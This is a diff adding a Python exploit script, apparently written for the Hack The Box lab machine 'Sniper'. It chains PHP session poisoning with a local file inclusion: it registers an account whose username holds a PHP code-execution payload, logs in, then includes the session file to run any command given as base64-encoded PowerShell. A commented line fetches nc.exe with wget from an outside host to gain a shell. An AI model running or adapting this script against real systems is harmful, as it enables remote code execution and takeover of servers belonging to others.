@@ -1,0 +1,68 @@
+#! /usr/bin/env python3
+# coding: utf-8
+
+#Original Author : Zied Namouchi AKA zpycho
+#Twitter : https://twitter.com/zpYcho
+#Inspired from HTB Box sniper
+#usage: python3 <script_name> <"command">
+
+
+import requests
+import secrets
+import base64
+import sys
+
+s = requests.session()
+s.cookies.clear()
+
+url_login = 'http://10.10.10.151/user/login.php'
+url_registration = 'http://10.10.10.151/user/registration.php'
+url_lfi = 'http://10.10.10.151/blog/?lang=/windows/temp/sess_'
+
+
+email = secrets.token_hex(16)+'@htb.com'
+password = secrets.token_hex(16)
+#global username
+
+
+def registration(data):
+	r = s.post(url_registration, data=data)
+	return r.cookies.items()[0][1]
+
+
+def command_injection(url, data, cookie):
+	command_injection_url = url_lfi + cookie
+	r = s.post(url_login, data=data)
+	r_inj = s.get(command_injection_url)
+	return r_inj.text
+
+
+def req_data(payload, req_type):
+	username = "<?=`" + payload + "`?>"
+
+	if req_type == "registration":
+		data = {'email': email,
+				'username': username,
+				'password': password,
+				'submit':''}
+	if req_type == "login":
+		data = {'username': username,
+				'password': password,
+				'submit':''}
+	
+	return data
+
+
+def main():
+	#payload = "wget 10.10.14.44/nc.exe -O /windows/temp/nc.exe".encode('utf-16le')
+	payload = sys.argv[1].encode('utf-16le')
+	payload_enc = base64.b64encode(bytes(payload))
+	print(str(payload_enc.decode()))
+	powershell_payload = "powershell /enc " + str(payload_enc.decode())
+	data = req_data(powershell_payload, "registration")
+	cookie = registration(data)
+	data = req_data(powershell_payload, "login")
+	res = command_injection(url_login, data, cookie)
+	print(res)
+
+main()
